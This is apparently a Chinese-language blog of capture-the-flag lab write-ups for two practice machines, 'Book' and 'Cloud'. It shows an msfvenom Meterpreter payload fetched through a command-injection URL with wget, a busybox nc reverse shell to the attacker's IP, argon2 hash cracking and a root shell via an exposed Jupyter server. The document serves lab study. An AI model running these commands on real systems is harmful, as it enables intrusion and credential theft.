<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/book]</span><br><span class="line">└─$ msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.43.68 LPORT=4444 -f elf -o payload</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload</span><br><span class="line">[-] No <span class="built_in">arch</span> selected, selecting <span class="built_in">arch</span>: x64 from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 1068952 bytes</span><br><span class="line">Final size of elf file: 1068952 bytes</span><br><span class="line">Saved as: payload</span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/HMV/book]</span><br><span class="line">└─$ file payload</span><br><span class="line">payload: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), static-pie linked, with debug_info, not stripped</span><br></pre></td></tr></table></figure>

<p>开个 http.server ，然后用命令执行把 payload 传上去：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/book]</span><br><span class="line">└─$ python3 -m http.server</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/book]</span><br><span class="line">└─$ curl <span class="string">&#x27;http://192.168.43.12?cmd=cd%20/tmp;wget%20http://192.168.43.68:8000/payload&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后在 <code>msf</code> 里面，开启meterpreter 反弹 shell 的监听：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/book]</span><br><span class="line">└─$ msfconsole</span><br><span class="line">Metasploit tip: View missing module options with show missing</span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line">         .                                         .</span><br><span class="line"> .</span><br><span class="line"></span><br><span class="line">      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o</span><br><span class="line">       <span class="string">&#x27;   dB&#x27;</span>                     BBP</span><br><span class="line">    dB<span class="string">&#x27;dB&#x27;</span>dB<span class="string">&#x27; dBBP     dBP     dBP BB</span></span><br><span class="line"><span class="string">   dB&#x27;</span>dB<span class="string">&#x27;dB&#x27;</span> dBP      dBP     dBP  BB</span><br><span class="line">  dB<span class="string">&#x27;dB&#x27;</span>dB<span class="string">&#x27; dBBBBP   dBP     dBBBBBBB</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP</span></span><br><span class="line"><span class="string">          .                  .                  dB&#x27;</span> dBP    dB<span class="string">&#x27;.BP</span></span><br><span class="line"><span class="string">                             |       dBP    dBBBB&#x27;</span> dBP    dB<span class="string">&#x27;.BP dBP    dBP</span></span><br><span class="line"><span class="string">                           --o--    dBP    dBP    dBP    dB&#x27;</span>.BP dBP    dBP</span><br><span class="line">                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP</span><br><span class="line"></span><br><span class="line">                                                                    .</span><br><span class="line">                .</span><br><span class="line">        o                  To boldly go <span class="built_in">where</span> no</span><br><span class="line">                            shell has gone before</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6.4.56-dev                          ]</span><br><span class="line">+ -- --=[ 2505 exploits - 1291 auxiliary - 431 post       ]</span><br><span class="line">+ -- --=[ 1610 payloads - 49 encoders - 13 nops           ]</span><br><span class="line">+ -- --=[ 9 evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit Documentation: https://docs.metasploit.com/</span><br><span class="line"></span><br><span class="line">msf6 &gt; use multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload linux/x64/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; linux/x64/meterpreter_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line"></span><br><span class="line">Payload options (linux/x64/meterpreter_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> LHOST 192.168.43.68</span><br><span class="line">LHOST =&gt; 192.168.43.68</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line">[*] Started reverse TCP handler on 192.168.43.68:4444</span><br></pre></td></tr></table></figure>

<p>记得一定要设置一下 <code>payload</code> 为刚才我们用 <code>msfvenom</code> 生成的木马的 payload，因为默认的 payload 为 <strong>generic&#x2F;shell_reverse_tcp</strong> ，如果不设置，反弹 shell 的时候会显示 <code>Command shell session 9 is not valid and will be closed</code> ，shell 就弹不回来。</p>
<p>然后在靶机上运行我们刚才传上去的 payload:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/book]</span><br><span class="line">└─$ curl <span class="string">&#x27;http://192.168.43.12?cmd=chmod%20+x%20/tmp/payload;/tmp/payload&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后 msf 这边 shell 就弹回来了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(multi/handler) &gt; run</span><br><span class="line">[*] Started reverse TCP handler on 192.168.43.68:4444 </span><br><span class="line">[*] Meterpreter session 1 opened (192.168.43.68:4444 -&gt; 192.168.43.12:56318) at 2025-08-15 16:25:24 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 2270 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查看靶机端口开放情况，发现有一个多余的 8888 端口开在了本地：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Book:~/html$ ss -tuln</span><br><span class="line">ss -tuln</span><br><span class="line">Netid   State    Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  </span><br><span class="line">udp     UNCONN   0        0                0.0.0.0:68             0.0.0.0:*                </span><br><span class="line">tcp     LISTEN   0        128              0.0.0.0:22             0.0.0.0:*     </span><br><span class="line">tcp     LISTEN   0        128            127.0.0.1:8888           0.0.0.0:*        </span><br><span class="line">tcp     LISTEN   0        128                    *:80                   *:*     </span><br><span class="line">tcp     LISTEN   0        128                 [::]:22                [::]:*     </span><br><span class="line">tcp     LISTEN   0        128                    *:443                  *:*     </span><br><span class="line">www-data@Book:~/html$</span><br></pre></td></tr></table></figure>

<p>用 <code>msf</code> 本身就有的 <code>portfwd</code> ，把靶机的 8888 端口给转发出来：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; portfwd -h</span><br><span class="line">Usage: portfwd [-h] [add | delete | list | flush] [args]</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line"></span><br><span class="line">    -h   Help banner.</span><br><span class="line">    -i   Index of the port forward entry to interact with (see the <span class="string">&quot;list&quot;</span> <span class="built_in">command</span>).</span><br><span class="line">    -l   Forward: <span class="built_in">local</span> port to listen on. Reverse: <span class="built_in">local</span> port to connect to.</span><br><span class="line">    -L   Forward: <span class="built_in">local</span> host to listen on (optional). Reverse: <span class="built_in">local</span> host to connect to.</span><br><span class="line">    -p   Forward: remote port to connect to. Reverse: remote port to listen on.</span><br><span class="line">    -r   Forward: remote host to connect to.</span><br><span class="line">    -R   Indicates a reverse port forward.</span><br><span class="line"></span><br><span class="line">meterpreter &gt; portfwd add -l 8888 -p 8888 -r 127.0.0.1</span><br><span class="line">[*] Forward TCP relay created: (<span class="built_in">local</span>) :8888 -&gt; (remote) 127.0.0.1:8888</span><br></pre></td></tr></table></figure>

<p>然后就去访问我们本地的 127.0.0.1:8888 :</p>
<p><img src="image2.webp" alt="image2"></p>
<p>发现是个 <code>jupyter</code> 的登录页面，尝试了几个弱密码，发现都不对。</p>
<p>想到密码可能藏在靶机里的某个地方，在靶机里找找跟 <code>jupyter</code> 有关的文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Book:~/html$ find / -name <span class="string">&#x27;*jupyter*&#x27;</span> 2&gt;/dev/null</span><br><span class="line">…………</span><br><span class="line">…………</span><br><span class="line">/var/backups/jupyter_server_config.json</span><br><span class="line">www-data@Book:~/html$</span><br></pre></td></tr></table></figure>

<p>找到了那个 config 文件，看一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Book:~/html$ <span class="built_in">cat</span> /var/backups/jupyter_server_config.json</span><br><span class="line"><span class="built_in">cat</span> /var/backups/jupyter_server_config.json</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;IdentityProvider&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;hashed_password&quot;</span>: <span class="string">&quot;argon2:$argon2id<span class="variable">$v</span>=19<span class="variable">$m</span>=10240,t=10,p=8<span class="variable">$FLuM1EM1nn</span>/EP9ni1ust1A<span class="variable">$BSnZUgXixY8B0Tzmffcz</span>/9Zo9cvEO/PeAu8zw/iYNI4&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;www-data@Book:~/html$</span><br></pre></td></tr></table></figure>

<p>发现里面有个 <code>argon2</code> 算法的密码，在网上找了个脚本<a href="https://github.com/p0dalirius/Argon2Cracker/blob/main/Argon2Cracker.py">(https://github.com/p0dalirius/Argon2Cracker/blob/main/Argon2Cracker.py)</a>，用这个脚本破解一下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Tools/Argon2_Cracker]</span><br><span class="line">└─$ python3 Argon2Cracker.py -w 5000.txt -v <span class="string">&#x27;$argon2id$v=19$m=10240,t=10,p=8$FLuM1EM1nn/EP9ni1ust1A$BSnZUgXixY8B0Tzmffcz/9Zo9cvEO/PeAu8zw/iYNI4&#x27;</span>  </span><br><span class="line">/home/kali/Tools/Argon2_Cracker/Argon2Cracker.py:18: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\$&#x27;</span></span><br><span class="line">  matched = re.search(<span class="string">&#x27;^\$(argon2(i|d|id))\$v=([0-9]+)\$([tpm=0-9,]+)\$([a-zA-Z0-9/\+]+)\$([a-zA-Z0-9/\+]+)&#x27;</span>, <span class="built_in">hash</span>)</span><br><span class="line">Argon2Cracker - v1.0 - by Remi GASCOU (Podalirius)</span><br><span class="line"></span><br><span class="line">[&gt;] Loading wordlist ... <span class="keyword">done</span>. (5000 candidates loaded)</span><br><span class="line">Version:  19 </span><br><span class="line">Params:  m=10240,t=10,p=8 </span><br><span class="line">Salt:  FLuM1EM1nn/EP9ni1ust1A </span><br><span class="line">Hash:  BSnZUgXixY8B0Tzmffcz/9Zo9cvEO/PeAu8zw/iYNI4 </span><br><span class="line"></span><br><span class="line">[2025/08/15 15h10m21s] Status (4494/5000) 89.88 % | Rate 44 H/s        </span><br><span class="line">[&gt;] Found: star123 </span><br></pre></td></tr></table></figure>

<p>破解出来密码是 <code>star123</code> ，登录 8888 端口：</p>
<p><img src="image3.webp" alt="image3"></p>
<p>进去就能看到 root flag.</p>
<p>然后在 <code>File</code> 按钮里面，可以创建一个 <code>Terminal</code>，直接就是 <code>root</code> 用户：</p>
<p><img src="image4.webp" alt="image4"></p>
<p><img src="image5.webp" alt="image5"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">user flag: flag&#123;user-a81e1f271bc4a3dd4ac87827da4d0a78&#125;</span><br><span class="line">root flag: flag&#123;root-4f98663772651c870e911982e991d0d9&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Maze-Sec</tag>
        <tag>Argon2</tag>
      </tags>
  </entry>
  <entry>
    <title>MazeSec-Cloud</title>
    <url>/2025/08/13/MazeSec-Cloud/</url>
    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/cloud]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -p- 192.168.43.154 -oA ports</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 10:01 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Cloud (192.168.43.154)</span><br><span class="line">Host is up (0.0045s latency).</span><br><span class="line">Not shown: 65529 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">666/tcp   open  doom</span><br><span class="line">9443/tcp  open  tungsten-https</span><br><span class="line">9455/tcp  open  unknown</span><br><span class="line">65443/tcp open  unknown</span><br><span class="line">MAC Address: 2A:A2:51:AE:EC:AD (Unknown)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 4.40 seconds</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/cloud]</span><br><span class="line">└─$ <span class="built_in">sudo</span> nmap -sT -sC -sV -O -p80,666,9443,9455,65443 192.168.43.154 -oA details</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-14 10:03 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> Cloud (192.168.43.154)</span><br><span class="line">Host is up (0.0026s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE  VERSION</span><br><span class="line">80/tcp    open  http</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html;charset=utf-8).</span></span><br><span class="line"><span class="string">| fingerprint-strings: </span></span><br><span class="line"><span class="string">|   GetRequest, HTTPOptions: </span></span><br><span class="line"><span class="string">|     HTTP/1.1 466 </span></span><br><span class="line"><span class="string">|     Date: Thu, 14 Aug 2025 02:03:23 GMT</span></span><br><span class="line"><span class="string">|     Content-Type: text/html;charset=utf-8</span></span><br><span class="line"><span class="string">|     Connection: close</span></span><br><span class="line"><span class="string">|     Set-Cookie: sl-session=XFXkLmuVnmgLUlSv1uOrAw==; Path=/; Max-Age=86400; HttpOnly</span></span><br><span class="line"><span class="string">|_    &lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;&lt;link rel=&quot;icon&quot; href=&quot;/.safeline/static/favicon.png&quot; type=&quot;image/png&quot;&gt;&lt;title id=&quot;slg-title&quot;&gt;&lt;/title&gt;&lt;style&gt;:root &#123;--primary-color:#0067B8;--light-primary-color:#0067B8cc;--font-color:#fff;--light-font-color:#ffffff80;--success-color:#00b87c;--warning-color:#ff6666;--warning-font-color:#fff;--warning-light-font-color:#ffffff80;&#125;&lt;/style&gt;&lt;style&gt;html&#123;height:100%&#125;body&#123;height:100%;margin:0;font-family:PingFang SC,Helvetica Neue,Helvetica,Arial,sans-serif&#125;#slg-bg&#123;background-color:var(--primary-color);z-index:100;width:100%;height:100%;position:fixed;inset:0&#125;#slg-box&#123;z-index:300;border-r</span></span><br><span class="line"><span class="string">666/tcp   open  http     nginx 1.18.0</span></span><br><span class="line"><span class="string">|_http-server-header: nginx/1.18.0</span></span><br><span class="line"><span class="string">|_http-title: Site doesn&#x27;</span>t have a title (text/html).</span><br><span class="line">9443/tcp  open  ssl/http nginx</span><br><span class="line">|_ssl-<span class="built_in">date</span>: TLS randomness does not represent <span class="keyword">time</span></span><br><span class="line">| tls-alpn: </span><br><span class="line">|   h2</span><br><span class="line">|   http/1.1</span><br><span class="line">|   http/1.0</span><br><span class="line">|_  http/0.9</span><br><span class="line">|_http-title: SafeLine Waf Community Edition</span><br><span class="line">| ssl-cert: Subject: organizationName=Chaitin Co., Ltd./stateOrProvinceName=Beijing/countryName=CN</span><br><span class="line">| Not valid before: 2023-12-04T14:36:41</span><br><span class="line">|_Not valid after:  2123-11-10T14:36:41</span><br><span class="line">|_http-trane-info: Problem with XML parsing of /evox/about</span><br><span class="line">9455/tcp  open  unknown</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   GenericLines: </span><br><span class="line">|     Welcome to Admin Service</span><br><span class="line">|     Type <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> available commands</span><br><span class="line">|     Available commands:</span><br><span class="line">|     <span class="built_in">help</span> - Show this <span class="built_in">help</span></span><br><span class="line">|     <span class="built_in">whoami</span> - Show current user</span><br><span class="line">|     system-status - Show system status</span><br><span class="line">|     <span class="built_in">exit</span> - Disconnect</span><br><span class="line">|     Unknown <span class="built_in">command</span>:</span><br><span class="line">|   GetRequest: </span><br><span class="line">|     Welcome to Admin Service</span><br><span class="line">|     Type <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> available commands</span><br><span class="line">|     Available commands:</span><br><span class="line">|     <span class="built_in">help</span> - Show this <span class="built_in">help</span></span><br><span class="line">|     <span class="built_in">whoami</span> - Show current user</span><br><span class="line">|     system-status - Show system status</span><br><span class="line">|     <span class="built_in">exit</span> - Disconnect</span><br><span class="line">|     Unknown <span class="built_in">command</span>: GET / HTTP/1.0</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     Welcome to Admin Service</span><br><span class="line">|     Type <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> available commands</span><br><span class="line">|     Available commands:</span><br><span class="line">|     <span class="built_in">help</span> - Show this <span class="built_in">help</span></span><br><span class="line">|     <span class="built_in">whoami</span> - Show current user</span><br><span class="line">|     system-status - Show system status</span><br><span class="line">|     <span class="built_in">exit</span> - Disconnect</span><br><span class="line">|     Unknown <span class="built_in">command</span>: OPTIONS / HTTP/1.0</span><br><span class="line">|   NULL: </span><br><span class="line">|     Welcome to Admin Service</span><br><span class="line">|     Type <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> available commands</span><br><span class="line">|     Available commands:</span><br><span class="line">|     <span class="built_in">help</span> - Show this <span class="built_in">help</span></span><br><span class="line">|     <span class="built_in">whoami</span> - Show current user</span><br><span class="line">|     system-status - Show system status</span><br><span class="line">|     <span class="built_in">exit</span> - Disconnect</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     Welcome to Admin Service</span><br><span class="line">|     Type <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> available commands</span><br><span class="line">|     Available commands:</span><br><span class="line">|     <span class="built_in">help</span> - Show this <span class="built_in">help</span></span><br><span class="line">|     <span class="built_in">whoami</span> - Show current user</span><br><span class="line">|     system-status - Show system status</span><br><span class="line">|     <span class="built_in">exit</span> - Disconnect</span><br><span class="line">|_    Unknown <span class="built_in">command</span>: OPTIONS / RTSP/1.0</span><br><span class="line">65443/tcp open  unknown</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, RPCCheck, RTSPRequest: </span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Date: Thu, 14 Aug 2025 02:03:28 GMT</span><br><span class="line">|     Content-Type: text/html</span><br><span class="line">|     Content-Length: 204</span><br><span class="line">|     Connection: close</span><br><span class="line">|     &lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;<span class="built_in">head</span>&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">|     &lt;hr&gt;&lt;center&gt;tengine&lt;/center&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|     &lt;/html&gt;</span><br><span class="line">|   GetRequest, HTTPOptions: </span><br><span class="line">|     HTTP/1.1 200 OK</span><br><span class="line">|     Date: Thu, 14 Aug 2025 02:03:28 GMT</span><br><span class="line">|     Content-Type: application/octet-stream</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|_    Connection: close</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose|router</span><br><span class="line">Running: Linux 4.X|5.X, MikroTik RouterOS 7.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3</span><br><span class="line">OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 161.40 seconds</span><br></pre></td></tr></table></figure>

<p>可以看到 80、666、9443、65443 四个端口似乎都是 web，9443 端口的title信息是 <strong>SafeLine Waf</strong> ,但最有趣的还是 9455 端口，暴露出来的信息是 <strong>Admin Server</strong> ，用 <code>nc</code> 连接 9455 端口看一下。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/cloud]</span><br><span class="line">└─$ nc 192.168.43.154 9455</span><br><span class="line">Welcome to Admin Service</span><br><span class="line">Type <span class="string">&#x27;help&#x27;</span> <span class="keyword">for</span> available commands</span><br><span class="line">Available commands:</span><br><span class="line">  <span class="built_in">help</span>          - Show this <span class="built_in">help</span></span><br><span class="line">  <span class="built_in">whoami</span>        - Show current user</span><br><span class="line">  system-status - Show system status</span><br><span class="line">  <span class="built_in">exit</span>          - Disconnect</span><br><span class="line"><span class="built_in">help</span></span><br><span class="line">Available commands:</span><br><span class="line">  <span class="built_in">help</span>          - Show this <span class="built_in">help</span></span><br><span class="line">  <span class="built_in">whoami</span>        - Show current user</span><br><span class="line">  system-status - Show system status</span><br><span class="line">  show-admin-pass - Show admin password</span><br><span class="line">  <span class="built_in">exit</span>          - Disconnect</span><br></pre></td></tr></table></figure>

<p>看上去是个自己搭建的对话程序，输入 <strong>help</strong> 之后，出现了一个有意思的 <strong>show-admin-pass</strong> 选项，输入这个命令之后，它返回了一个密码：<code>Admin Password: 5jRrRnE9</code>，可能这个密码在某个 web 的登录页面会用到。</p>
<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><p>接下来看看 80 端口：</p>
<p><img src="image1.webp" alt="image1"></p>
<p>是个雷池 WAF ，看样子现在还进不去。</p>
<p>想到前面信息收集的时候，9443 端口的 title 是 <strong>SafeLine WAF</strong> ，网上简单搜索一下也能知道，这个 <strong>SafeLien WAF</strong> 就是雷池 WAF，因此选择去 9443 端口看看：</p>
<p><img src="image2.webp" alt="image2"></p>
<p>果然是个雷池 WAF 的登录页面，拿前面收集到的密码 <code>5jRrRnE9</code> 去登录 <code>admin</code> 账户：</p>
<p><img src="image3.webp" alt="image3"></p>
<p>想到前面访问 80 端口的时候，页面显示被 WAF 拦住了，因此我们应该可以在这个雷池 WAF 的管理页面对 80 端口的访问情况进行一些修改。</p>
<p>把如下的 <code>维护模式</code> 改成 <code>观察模式</code>，想必 80 端口就可以访问了：</p>
<p><img src="image4.webp" alt="image4"></p>
<p>然后再去访问 80 端口：</p>
<p><img src="image5.webp" alt="image5"></p>
<p>访问之后发现域名变成了 <code>cloud.dsz</code>，那就加入 <strong>hosts</strong> 之后再去访问：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> vim /etc/hosts</span><br><span class="line"></span><br><span class="line">192.168.43.154 cloud.dsz</span><br></pre></td></tr></table></figure>

<p><img src="image6.webp" alt="image6"></p>
<p>进去之后在 <code>选择检查项</code> 那里可以选择 <strong>自定义命令</strong> ，那就直接执行反弹 shell 就好了：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">busybox nc 192.168.43.68 1234 -e /bin/bash</span><br></pre></td></tr></table></figure>

<h2 id="获取立足点"><a href="#获取立足点" class="headerlink" title="获取立足点"></a>获取立足点</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/HMV/cloud]</span><br><span class="line">└─$ nc -nvlp 1234         </span><br><span class="line">Listening on 0.0.0.0 1234</span><br><span class="line">Connection received on 192.168.43.154 39804</span><br><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line">www-data@Cloud:~/html$</span><br></pre></td></tr></table></figure>

<p>在 <strong>&#x2F;home&#x2F;lucky</strong> 目录下，拿到了 user flag：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Cloud:/home/lucky$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">www-data@Cloud:/home/lucky$ <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">flag&#123;user-72cfd272ace172fa35026445fbef9b03&#125;</span><br><span class="line">www-data@Cloud:/home/lucky$</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>同样在 <strong>&#x2F;home&#x2F;lucky</strong> 目录下，有一个 <code>.hint</code> 文件，但是我们无法查看：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Cloud:/home/lucky$ <span class="built_in">ls</span> -liah</span><br><span class="line"><span class="built_in">ls</span> -liah</span><br><span class="line">total 28K</span><br><span class="line">527366 drwxr-xr-x 2 lucky lucky 4.0K Aug 12 06:04 .</span><br><span class="line">523265 drwxr-xr-x 3 root  root  4.0K Aug 12 03:38 ..</span><br><span class="line">527367 -rw-r--r-- 1 lucky lucky  220 Aug 12 03:38 .bash_logout</span><br><span class="line">527368 -rw-r--r-- 1 lucky lucky 3.5K Aug 12 03:38 .bashrc</span><br><span class="line">530672 -rw------- 1 lucky lucky   45 Aug 12 06:04 .hint</span><br><span class="line">527369 -rw-r--r-- 1 lucky lucky  807 Aug 12 03:38 .profile</span><br><span class="line">530667 -rw-r--r-- 1 root  root    44 Aug 12 03:38 user.txt</span><br><span class="line">www-data@Cloud:/home/lucky$ <span class="built_in">cat</span> .hint</span><br><span class="line"><span class="built_in">cat</span> .hint</span><br><span class="line"><span class="built_in">cat</span>: .hint: Permission denied</span><br><span class="line">www-data@Cloud:/home/lucky$ </span><br></pre></td></tr></table></figure>

<p>因此我们需要想办法提权到 lucky 这个用户才行。</p>
<p>在根目录 <code>/</code> 下，我发现了一个比较多余的目录 <code>data</code> ：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@Cloud:~$ <span class="built_in">cd</span> /</span><br><span class="line"><span class="built_in">cd</span> /</span><br><span class="line">www-data@Cloud:/$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">bin   dev   initrd.img      lib32   lost+found  opt   run   sys  var</span><br><span class="line">boot  etc   initrd.img.old  lib64   media       proc  sbin  tmp  vmlinuz</span><br><span class="line">data  home  lib             libx32  mnt         root  srv   usr  vmlinuz.old</span><br><span class="line">www-data@Cloud:/$</span><br></pre></td></tr></table></figure>

<p> 进到 <code>data</code> 目录里面查看，找到了一个 <code>docker-compose.yaml</code>，内容如下：</p>
 <figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"> <span class="attr">networks:</span></span><br><span class="line">  <span class="attr">safeline-ce:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">safeline-ce</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span></span><br><span class="line">    <span class="attr">ipam:</span></span><br><span class="line">      <span class="attr">driver:</span> <span class="string">default</span></span><br><span class="line">      <span class="attr">config:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">gateway:</span> <span class="string">$&#123;SUBNET_PREFIX:?SUBNET_PREFIX</span> <span class="string">required&#125;.1</span></span><br><span class="line">          <span class="attr">subnet:</span> <span class="string">$&#123;SUBNET_PREFIX&#125;.0/24</span></span><br><span class="line">    <span class="attr">driver_opts:</span></span><br><span class="line">      <span class="attr">com.docker.network.bridge.name:</span> <span class="string">safeline-ce</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">postgres:</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">safeline-pg</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">$&#123;IMAGE_PREFIX&#125;/safeline-postgres$&#123;ARCH_SUFFIX&#125;:15.2</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">$&#123;SAFELINE_DIR&#125;/resources/postgres/data:/var/lib/postgresql/data</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/etc/localtime:/etc/localtime:ro</span></span><br><span class="line">    <span 